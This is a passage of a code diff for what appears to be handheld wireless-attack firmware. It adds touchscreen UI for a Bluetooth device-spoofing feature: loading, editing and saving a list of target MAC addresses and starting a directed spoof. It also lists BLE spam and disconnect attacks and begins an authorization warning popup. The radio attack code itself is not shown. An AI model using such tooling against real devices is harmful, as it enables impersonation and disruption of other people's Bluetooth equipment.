+    lv_obj_t *spoof_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "Device\nSpoof", COLOR_MATERIAL_ORANGE, NULL, NULL);
+    lv_obj_add_event_cb(spoof_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Spoof SAS");
+
+    lv_obj_t *disc_tile = create_tile(tiles, LV_SYMBOL_CLOSE, "BLE\nDisconnect", COLOR_MATERIAL_PINK, NULL, NULL);
+    lv_obj_add_event_cb(disc_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Disc SAS");
+
+    /* Back button — return to SAS actions */
+    lv_obj_t *back_btn = lv_btn_create(function_page);
+    lv_obj_set_size(back_btn, 110, 28);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(back_btn, 4, 0);
+    lv_obj_t *back_icon = lv_label_create(back_btn);
+    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
+    lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(back_icon, lv_color_white(), 0);
+    lv_obj_t *back_lbl = lv_label_create(back_btn);
+    lv_label_set_text(back_lbl, "Actions");
+    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
+    lv_obj_set_user_data(back_btn, (void *)show_bt_attack_tiles_screen);
+    lv_obj_add_event_cb(back_btn, stub_back_btn_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// -- General BLE Spoof (spooflist.txt) --
+
+static bool spoof_mac_parse(const char *str, uint8_t *mac) {
+    unsigned int b[6];
+    if (sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
+               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
+        // BLE addresses are stored LSB-first internally; user types MSB-first
+        mac[0] = (uint8_t)b[5];
+        mac[1] = (uint8_t)b[4];
+        mac[2] = (uint8_t)b[3];
+        mac[3] = (uint8_t)b[2];
+        mac[4] = (uint8_t)b[1];
+        mac[5] = (uint8_t)b[0];
+        return true;
+    }
+    return false;
+}
+
+static void spoof_list_load(void) {
+    s_spoof_list_count = 0;
+    ensure_sd_mounted();
+    if (!sd_spi_mutex) return;
+    if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(1000)) != pdTRUE) return;
+    FILE *fp = fopen(SPOOF_LIST_PATH, "r");
+    if (fp) {
+        char line[80];
+        while (s_spoof_list_count < SPOOF_LIST_MAX && fgets(line, sizeof(line), fp)) {
+            line[strcspn(line, "\r\n")] = '\0';
+            // skip header row
+            if (strncasecmp(line, "mac,", 4) == 0) continue;
+            char *comma = strchr(line, ',');
+            if (!comma) continue;
+            *comma = '\0';
+            uint8_t mac[6];
+            if (!spoof_mac_parse(line, mac)) continue;
+            memcpy(s_spoof_list[s_spoof_list_count].mac, mac, 6);
+            strncpy(s_spoof_list[s_spoof_list_count].name, comma + 1,
+                    sizeof(s_spoof_list[0].name) - 1);
+            s_spoof_list[s_spoof_list_count].name[sizeof(s_spoof_list[0].name) - 1] = '\0';
+            s_spoof_list_count++;
+        }
+        fclose(fp);
+    }
+    xSemaphoreGive(sd_spi_mutex);
+}
+
+static bool spoof_list_save(void) {
+    ensure_sd_mounted();
+    if (!sd_spi_mutex) return false;
+    if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(1000)) != pdTRUE) return false;
+    mkdir("/sdcard/lab/bluetooth", 0777);
+    FILE *fp = fopen(SPOOF_LIST_PATH, "w");
+    bool ok = (fp != NULL);
+    if (fp) {
+        fprintf(fp, "mac,name\n");
+        for (int i = 0; i < s_spoof_list_count; i++) {
+            fprintf(fp, "%02X:%02X:%02X:%02X:%02X:%02X,%s\n",
+                    s_spoof_list[i].mac[5], s_spoof_list[i].mac[4],
+                    s_spoof_list[i].mac[3], s_spoof_list[i].mac[2],
+                    s_spoof_list[i].mac[1], s_spoof_list[i].mac[0],
+                    s_spoof_list[i].name);
+        }
+        fclose(fp);
+    }
+    xSemaphoreGive(sd_spi_mutex);
+    return ok;
+}
+
+static bool spoof_list_append(const uint8_t *mac, const char *name) {
+    if (s_spoof_list_count >= SPOOF_LIST_MAX) return false;
+    memcpy(s_spoof_list[s_spoof_list_count].mac, mac, 6);
+    strncpy(s_spoof_list[s_spoof_list_count].name, name ? name : "",
+            sizeof(s_spoof_list[0].name) - 1);
+    s_spoof_list[s_spoof_list_count].name[sizeof(s_spoof_list[0].name) - 1] = '\0';
+    s_spoof_list_count++;
+    return spoof_list_save();
+}
+
+static void spoof_gen_row_cb(lv_event_t *e) {
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (idx < 0 || idx >= s_spoof_list_count) return;
+    if (s_spoof_delete[idx]) return;  // don't select rows marked for deletion
+    s_spoof_list_selected = idx;
+    if (!s_spoof_list_scroll || !lv_obj_is_valid(s_spoof_list_scroll)) return;
+    uint32_t child_cnt = lv_obj_get_child_cnt(s_spoof_list_scroll);
+    for (uint32_t i = 0; i < child_cnt; i++) {
+        lv_obj_t *row = lv_obj_get_child(s_spoof_list_scroll, i);
+        if (!row) continue;
+        int row_idx = (int)(intptr_t)lv_obj_get_user_data(row);
+        if (row_idx < 0 || row_idx >= SPOOF_LIST_MAX) continue;
+        lv_obj_set_style_bg_color(row,
+            s_spoof_delete[row_idx] ? lv_color_make(80, 20, 20) :
+            row_idx == idx         ? lv_color_make(30, 80, 160) :
+                                     lv_color_make(40, 40, 40), 0);
+    }
+}
+
+static void spoof_gen_back_cb(lv_event_t *e) {
+    (void)e;
+    s_spoof_list_scroll = NULL;
+    s_spoof_list_selected = -1;
+    show_bt_attacks_screen();
+}
+
+static void ble_spoof_general_proceed(void) {
+    if (s_spoof_list_selected < 0 || s_spoof_list_selected >= s_spoof_list_count) return;
+    s_ble_spoof_return_fn = show_ble_spoof_general_screen;
+    memcpy(ble_spoof_target_mac, s_spoof_list[s_spoof_list_selected].mac, 6);
+    // bt_sas_target_addr/name drive the display card in show_ble_spoof_directed_screen
+    memcpy(bt_sas_target_addr, s_spoof_list[s_spoof_list_selected].mac, 6);
+    strncpy(bt_sas_target_name, s_spoof_list[s_spoof_list_selected].name,
+            sizeof(bt_sas_target_name) - 1);
+    bt_sas_target_name[sizeof(bt_sas_target_name) - 1] = '\0';
+    strncpy(ble_spoof_target_name_str, s_spoof_list[s_spoof_list_selected].name,
+            sizeof(ble_spoof_target_name_str) - 1);
+    ble_spoof_target_name_str[sizeof(ble_spoof_target_name_str) - 1] = '\0';
+    ble_spoof_target_company_id = 0;
+    ble_spoof_target_idx = 0;
+    show_ble_spoof_directed_screen();
+}
+
+static void spoof_gen_toggle_del_cb(lv_event_t *e) {
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (idx < 0 || idx >= s_spoof_list_count) return;
+    s_spoof_delete[idx] = !s_spoof_delete[idx];
+    bool marked = s_spoof_delete[idx];
+
+    // Update row background via parent (scroll container children)
+    lv_obj_t *btn = lv_event_get_target(e);
+    lv_obj_t *row = lv_obj_get_parent(btn);
+    if (row && lv_obj_is_valid(row))
+        lv_obj_set_style_bg_color(row,
+            marked ? lv_color_make(80, 20, 20) : lv_color_make(40, 40, 40), 0);
+
+    lv_obj_set_style_bg_color(btn,
+        marked ? COLOR_MATERIAL_RED : lv_color_make(70, 70, 70), LV_STATE_DEFAULT);
+    lv_obj_t *lbl = lv_obj_get_child(btn, 0);
+    if (lbl) lv_label_set_text(lbl, marked ? LV_SYMBOL_TRASH : LV_SYMBOL_CLOSE);
+
+    // If selected row is now marked, deselect it
+    if (marked && s_spoof_list_selected == idx)
+        s_spoof_list_selected = -1;
+}
+
+static void spoof_gen_save_cb(lv_event_t *e) {
+    (void)e;
+    int new_count = 0;
+    for (int i = 0; i < s_spoof_list_count; i++) {
+        if (!s_spoof_delete[i])
+            s_spoof_list[new_count++] = s_spoof_list[i];
+    }
+    s_spoof_list_count = new_count;
+    s_spoof_list_scroll = NULL;
+    spoof_list_save();
+    show_ble_spoof_general_screen();
+}
+
+static void spoof_gen_start_cb(lv_event_t *e) {
+    (void)e;
+    if (s_spoof_list_selected < 0 || s_spoof_list_selected >= s_spoof_list_count) return;
+    ble_spoof_general_proceed();
+}
+
+static void spoof_gen_add_cb(lv_event_t *e) {
+    (void)e;
+    s_spoof_list_scroll = NULL;
+    show_spoof_add_entry_screen();
+}
+
+// -- Add Spoof Entry screen --
+
+static void spoof_add_ta_focus_cb(lv_event_t *e) {
+    lv_obj_t *ta = lv_event_get_target(e);
+    lv_obj_t *kb = (lv_obj_t *)lv_event_get_user_data(e);
+    if (kb && lv_obj_is_valid(kb))
+        lv_keyboard_set_textarea(kb, ta);
+}
+
+static void spoof_add_back_cb(lv_event_t *e) {
+    (void)e;
+    s_spoof_mac_ta    = NULL;
+    s_spoof_name_ta   = NULL;
+    s_spoof_add_popup = NULL;
+    show_ble_spoof_general_screen();
+}
+
+static void spoof_add_save_cb(lv_event_t *e) {
+    (void)e;
+    if (!s_spoof_mac_ta || !lv_obj_is_valid(s_spoof_mac_ta)) return;
+    const char *mac_str  = lv_textarea_get_text(s_spoof_mac_ta);
+    const char *name_str = (s_spoof_name_ta && lv_obj_is_valid(s_spoof_name_ta))
+                           ? lv_textarea_get_text(s_spoof_name_ta) : "";
+    uint8_t mac[6];
+    if (!spoof_mac_parse(mac_str, mac)) return;
+    spoof_list_append(mac, name_str);
+    s_spoof_mac_ta    = NULL;
+    s_spoof_name_ta   = NULL;
+    s_spoof_add_popup = NULL;
+    show_ble_spoof_general_screen();
+}
+
+static void show_spoof_add_entry_screen(void) {
+    s_spoof_mac_ta    = NULL;
+    s_spoof_name_ta   = NULL;
+    s_spoof_add_popup = NULL;
+
+    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+    reset_function_page_children();
+
+    create_function_page_base("Add Spoof Entry");
+
+    lv_obj_t *hint = lv_label_create(function_page);
+    lv_label_set_text(hint, "MAC  e.g. AA:BB:CC:DD:EE:FF");
+    lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(hint, lv_color_make(140, 140, 140), 0);
+    lv_obj_align(hint, LV_ALIGN_TOP_MID, 0, 36);
+
+    s_spoof_mac_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(s_spoof_mac_ta, 210, 38);
+    lv_obj_align(s_spoof_mac_ta, LV_ALIGN_TOP_MID, 0, 52);
+    lv_textarea_set_one_line(s_spoof_mac_ta, true);
+    lv_textarea_set_max_length(s_spoof_mac_ta, 17);
+    lv_textarea_set_placeholder_text(s_spoof_mac_ta, "AA:BB:CC:DD:EE:FF");
+    lv_obj_set_style_text_font(s_spoof_mac_ta, &lv_font_montserrat_14, 0);
+
+    s_spoof_name_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(s_spoof_name_ta, 210, 36);
+    lv_obj_align(s_spoof_name_ta, LV_ALIGN_TOP_MID, 0, 98);
+    lv_textarea_set_one_line(s_spoof_name_ta, true);
+    lv_textarea_set_max_length(s_spoof_name_ta, 32);
+    lv_textarea_set_placeholder_text(s_spoof_name_ta, "Device name (optional)");
+    lv_obj_set_style_text_font(s_spoof_name_ta, &lv_font_montserrat_14, 0);
+
+    lv_obj_t *btn_row = lv_obj_create(function_page);
+    lv_obj_set_size(btn_row, 228, 36);
+    lv_obj_align(btn_row, LV_ALIGN_TOP_MID, 0, 142);
+    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(btn_row, 0, 0);
+    lv_obj_set_style_pad_all(btn_row, 0, 0);
+    lv_obj_set_style_pad_column(btn_row, 8, 0);
+    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_BETWEEN,
+                           LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *back_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(back_btn, 104, 34);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_t *bk_lbl = lv_label_create(back_btn);
+    lv_label_set_text(bk_lbl, LV_SYMBOL_LEFT " Back");
+    lv_obj_set_style_text_font(bk_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bk_lbl, ui_text_color(), 0);
+    lv_obj_center(bk_lbl);
+    lv_obj_add_event_cb(back_btn, spoof_add_back_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *save_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(save_btn, 104, 34);
+    lv_obj_set_style_bg_color(save_btn, lv_color_make(30, 100, 30), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(save_btn, lv_color_make(50, 140, 50), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(save_btn, 0, 0);
+    lv_obj_set_style_radius(save_btn, 8, 0);
+    lv_obj_t *sv_lbl = lv_label_create(save_btn);
+    lv_label_set_text(sv_lbl, LV_SYMBOL_SAVE " Save");
+    lv_obj_set_style_text_font(sv_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(sv_lbl, lv_color_white(), 0);
+    lv_obj_center(sv_lbl);
+    lv_obj_add_event_cb(save_btn, spoof_add_save_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *kb = lv_keyboard_create(function_page);
+    lv_keyboard_set_textarea(kb, s_spoof_mac_ta);
+    lv_keyboard_set_mode(kb, LV_KEYBOARD_MODE_TEXT_UPPER);
+    lv_obj_set_size(kb, lv_pct(100), lv_pct(40));
+    lv_obj_align(kb, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(kb, ui_bg_color(), LV_PART_MAIN);
+    lv_obj_set_style_text_color(kb, ui_text_color(), LV_PART_MAIN);
+    lv_obj_set_style_bg_color(kb, lv_color_make(40, 40, 60), LV_PART_ITEMS);
+    lv_obj_set_style_bg_color(kb, lv_color_make(70, 70, 100),
+                               LV_PART_ITEMS | LV_STATE_PRESSED);
+    lv_obj_set_style_text_color(kb, ui_text_color(), LV_PART_ITEMS);
+    lv_obj_set_style_border_color(kb, ui_border_color(), LV_PART_ITEMS);
+    lv_obj_set_style_border_width(kb, 1, LV_PART_ITEMS);
+
+    lv_obj_add_event_cb(s_spoof_mac_ta,  spoof_add_ta_focus_cb, LV_EVENT_CLICKED, kb);
+    lv_obj_add_event_cb(s_spoof_name_ta, spoof_add_ta_focus_cb, LV_EVENT_CLICKED, kb);
+}
+
+static void show_ble_spoof_general_screen(void) {
+    s_spoof_list_selected = -1;
+    s_spoof_list_scroll   = NULL;
+    memset(s_spoof_delete, 0, sizeof(s_spoof_delete));
+
+    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+    reset_function_page_children();
+
+    spoof_list_load();
+
+    create_function_page_base("Device Spoof");
+    apply_menu_bg();
+
+    lv_obj_t *sub = lv_label_create(function_page);
+    char sub_buf[32];
+    if (s_spoof_list_count == 0)
+        snprintf(sub_buf, sizeof(sub_buf), "Spoof List - empty");
+    else
+        snprintf(sub_buf, sizeof(sub_buf), "Spoof List (%d)", s_spoof_list_count);
+    lv_label_set_text(sub, sub_buf);
+    lv_obj_set_style_text_font(sub, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(sub, lv_color_make(140, 140, 140), 0);
+    lv_obj_align(sub, LV_ALIGN_TOP_MID, 0, 34);
+
+    s_spoof_list_scroll = lv_obj_create(function_page);
+    lv_obj_set_size(s_spoof_list_scroll, 228, 190);
+    lv_obj_align(s_spoof_list_scroll, LV_ALIGN_TOP_MID, 0, 52);
+    lv_obj_set_style_bg_color(s_spoof_list_scroll, ui_bg_color(), 0);
+    lv_obj_set_style_border_width(s_spoof_list_scroll, 0, 0);
+    lv_obj_set_style_pad_all(s_spoof_list_scroll, 4, 0);
+    lv_obj_set_style_pad_row(s_spoof_list_scroll, 4, 0);
+    lv_obj_set_flex_flow(s_spoof_list_scroll, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(s_spoof_list_scroll, LV_FLEX_ALIGN_START,
+                           LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+
+    if (s_spoof_list_count == 0) {
+        lv_obj_t *empty = lv_label_create(s_spoof_list_scroll);
+        lv_label_set_text(empty, "No devices in spoof list.\nTap + Add to add one.");
+        lv_obj_set_style_text_font(empty, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(empty, lv_color_make(176, 176, 176), 0);
+    }
+
+    for (int i = 0; i < s_spoof_list_count; i++) {
+        // Row container — horizontal: info column + X button
+        lv_obj_t *row = lv_obj_create(s_spoof_list_scroll);
+        lv_obj_set_width(row, lv_pct(100));
+        lv_obj_set_height(row, LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(row, lv_color_make(40, 40, 40), 0);
+        lv_obj_set_style_border_width(row, 0, 0);
+        lv_obj_set_style_radius(row, 6, 0);
+        lv_obj_set_style_pad_all(row, 6, 0);
+        lv_obj_set_style_pad_column(row, 6, 0);
+        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
+        lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START,
+                               LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_set_user_data(row, (void *)(intptr_t)i);
+
+        // Info column — tap to select for START
+        lv_obj_t *info = lv_obj_create(row);
+        lv_obj_set_flex_grow(info, 1);
+        lv_obj_set_height(info, LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_opa(info, LV_OPA_TRANSP, 0);
+        lv_obj_set_style_border_width(info, 0, 0);
+        lv_obj_set_style_pad_all(info, 0, 0);
+        lv_obj_set_flex_flow(info, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_flex_align(info, LV_FLEX_ALIGN_START,
+                               LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+        lv_obj_clear_flag(info, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_add_flag(info, LV_OBJ_FLAG_CLICKABLE);
+        lv_obj_set_user_data(info, (void *)(intptr_t)i);
+
+        lv_obj_t *name_lbl = lv_label_create(info);
+        lv_label_set_text(name_lbl,
+            s_spoof_list[i].name[0] ? s_spoof_list[i].name : "Unknown");
+        lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
+        lv_obj_set_width(name_lbl, 155);
+        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
+
+        char mac_str[18];
+        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 s_spoof_list[i].mac[5], s_spoof_list[i].mac[4], s_spoof_list[i].mac[3],
+                 s_spoof_list[i].mac[2], s_spoof_list[i].mac[1], s_spoof_list[i].mac[0]);
+        lv_obj_t *mac_lbl = lv_label_create(info);
+        lv_label_set_text(mac_lbl, mac_str);
+        lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(mac_lbl, lv_color_make(140, 140, 140), 0);
+
+        lv_obj_add_event_cb(info, spoof_gen_row_cb, LV_EVENT_CLICKED,
+                            (void *)(intptr_t)i);
+
+        // X toggle button — tap to mark/unmark for deletion
+        lv_obj_t *del_toggle = lv_btn_create(row);
+        lv_obj_set_size(del_toggle, 38, 38);
+        lv_obj_set_style_bg_color(del_toggle, lv_color_make(70, 70, 70), LV_STATE_DEFAULT);
+        lv_obj_set_style_bg_color(del_toggle, lv_color_make(100, 100, 100), LV_STATE_PRESSED);
+        lv_obj_set_style_border_width(del_toggle, 0, 0);
+        lv_obj_set_style_radius(del_toggle, 6, 0);
+        lv_obj_set_style_pad_all(del_toggle, 4, 0);
+        lv_obj_t *x_icon = lv_label_create(del_toggle);
+        lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
+        lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(x_icon, lv_color_make(200, 200, 200), 0);
+        lv_obj_center(x_icon);
+        lv_obj_add_event_cb(del_toggle, spoof_gen_toggle_del_cb, LV_EVENT_CLICKED,
+                            (void *)(intptr_t)i);
+    }
+
+    // Bottom buttons: [Back] [+ Add] [Save] [START]
+    lv_obj_t *btn_row = lv_obj_create(function_page);
+    lv_obj_set_size(btn_row, 228, 36);
+    lv_obj_align(btn_row, LV_ALIGN_BOTTOM_MID, 0, -8);
+    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(btn_row, 0, 0);
+    lv_obj_set_style_pad_all(btn_row, 0, 0);
+    lv_obj_set_style_pad_column(btn_row, 4, 0);
+    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_BETWEEN,
+                           LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *back_btn2 = lv_btn_create(btn_row);
+    lv_obj_set_size(back_btn2, 52, 32);
+    lv_obj_set_style_bg_color(back_btn2, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn2, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn2, 0, 0);
+    lv_obj_set_style_radius(back_btn2, 8, 0);
+    lv_obj_t *bk2_lbl = lv_label_create(back_btn2);
+    lv_label_set_text(bk2_lbl, LV_SYMBOL_LEFT " Back");
+    lv_obj_set_style_text_font(bk2_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(bk2_lbl, ui_text_color(), 0);
+    lv_obj_center(bk2_lbl);
+    lv_obj_add_event_cb(back_btn2, spoof_gen_back_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *add_btn2 = lv_btn_create(btn_row);
+    lv_obj_set_size(add_btn2, 62, 32);
+    lv_obj_set_style_bg_color(add_btn2, lv_color_make(30, 80, 160), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(add_btn2, lv_color_make(50, 110, 200), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(add_btn2, 0, 0);
+    lv_obj_set_style_radius(add_btn2, 8, 0);
+    lv_obj_t *add2_lbl = lv_label_create(add_btn2);
+    lv_label_set_text(add2_lbl, LV_SYMBOL_PLUS " Add");
+    lv_obj_set_style_text_font(add2_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(add2_lbl, lv_color_white(), 0);
+    lv_obj_center(add2_lbl);
+    lv_obj_add_event_cb(add_btn2, spoof_gen_add_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *save_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(save_btn, 58, 32);
+    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(save_btn, 0, 0);
+    lv_obj_set_style_radius(save_btn, 8, 0);
+    lv_obj_t *sv_lbl = lv_label_create(save_btn);
+    lv_label_set_text(sv_lbl, LV_SYMBOL_SAVE " Save");
+    lv_obj_set_style_text_font(sv_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(sv_lbl, lv_color_white(), 0);
+    lv_obj_center(sv_lbl);
+    lv_obj_add_event_cb(save_btn, spoof_gen_save_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *start_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(start_btn, 56, 32);
+    lv_obj_set_style_bg_color(start_btn, COLOR_MATERIAL_ORANGE, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(start_btn, lv_color_lighten(COLOR_MATERIAL_ORANGE, 30),
+                               LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(start_btn, 0, 0);
+    lv_obj_set_style_radius(start_btn, 8, 0);
+    lv_obj_set_flex_flow(start_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(start_btn, LV_FLEX_ALIGN_CENTER,
+                           LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(start_btn, 3, 0);
+    lv_obj_t *st_icon = lv_label_create(start_btn);
+    lv_label_set_text(st_icon, LV_SYMBOL_PLAY);
+    lv_obj_set_style_text_font(st_icon, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(st_icon, lv_color_white(), 0);
+    lv_obj_t *st_lbl = lv_label_create(start_btn);
+    lv_label_set_text(st_lbl, "START");
+    lv_obj_set_style_text_font(st_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(st_lbl, lv_color_white(), 0);
+    lv_obj_add_event_cb(start_btn, spoof_gen_start_cb, LV_EVENT_CLICKED, NULL);
+}
+
 static void show_bt_attacks_screen(void)
 {
     create_function_page_base("BT Attacks");
@@ -19423,11 +21514,8 @@ static void show_bt_attacks_screen(void)
     lv_obj_t *spam_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "BLE\nSpam", COLOR_MATERIAL_RED, NULL, NULL);
     lv_obj_add_event_cb(spam_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Spam");
 
-    lv_obj_t *spoof_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "Device\nSpoof", COLOR_MATERIAL_AMBER, NULL, NULL);
-    lv_obj_add_event_cb(spoof_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Spoof");
-
-    lv_obj_t *disc_tile = create_tile(tiles, LV_SYMBOL_CLOSE, "BLE\nDisconnect", COLOR_MATERIAL_ORANGE, NULL, NULL);
-    lv_obj_add_event_cb(disc_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Disconnect");
+    lv_obj_t *spoof_gen_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "Device\nSpoof", COLOR_MATERIAL_ORANGE, NULL, NULL);
+    lv_obj_add_event_cb(spoof_gen_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Spoof General");
 
     /* Back button */
     lv_obj_t *back_btn = lv_btn_create(function_page);
@@ -19789,6 +21877,220 @@ static void show_bt_conflict_warning(const char *fname, void (*proceed_fn)(void)
                         (void *)proceed_fn);
 }
 
+// ── Active-Attack authorization warning popup ─────────────────────────────────
+static void attack_warning_dismiss_cb(lv_event_t *e)
+{
+    (void)e;
+    if (s_attack_warning_popup && lv_obj_is_valid(s_attack_warning_popup)) {
+        lv_obj_del(s_attack_warning_popup);
+        s_attack_warning_popup = NULL;
+    }
+}
+
+static void attack_warning_proceed_cb(lv_event_t *e)
+{
+    void (*proceed_fn)(void) = (void (*)(void))lv_event_get_user_data(e);
+    if (s_attack_warning_popup && lv_obj_is_valid(s_attack_warning_popup)) {
+        lv_obj_del(s_attack_warning_popup);
+        s_attack_warning_popup = NULL;
+    }
+    if (proceed_fn) proceed_fn();
+}
+
+static void show_attack_warning(void (*proceed_fn)(void))
+{
+    if (s_attack_warning_popup && lv_obj_is_valid(s_attack_warning_popup)) {
+        lv_obj_del(s_attack_warning_popup);
+        s_attack_warning_popup = NULL;
+    }
+
+    s_attack_warning_popup = lv_obj_create(lv_layer_top());
+    lv_obj_set_size(s_attack_warning_popup, LV_PCT(100), LV_PCT(100));
+    lv_obj_set_style_bg_color(s_attack_warning_popup, lv_color_black(), 0);
+    lv_obj_set_style_bg_opa(s_attack_warning_popup, LV_OPA_70, 0);
+    lv_obj_set_style_border_width(s_attack_warning_popup, 0, 0);
+    lv_obj_clear_flag(s_attack_warning_popup, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *card = lv_obj_create(s_attack_warning_popup);
+    lv_obj_set_size(card, 218, 195);
+    lv_obj_center(card);
+    lv_obj_set_style_bg_color(card, lv_color_make(0x40, 0x00, 0x00), 0);
+    lv_obj_set_style_border_color(card, COLOR_MATERIAL_RED, 0);
+    lv_obj_set_style_border_width(card, 2, 0);
+    lv_obj_set_style_radius(card, 10, 0);
+    lv_obj_set_style_pad_all(card, 12, 0);
+    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *title = lv_label_create(card);
+    lv_label_set_text(title, LV_SYMBOL_WARNING " ACTIVE ATTACK " LV_SYMBOL_WARNING);
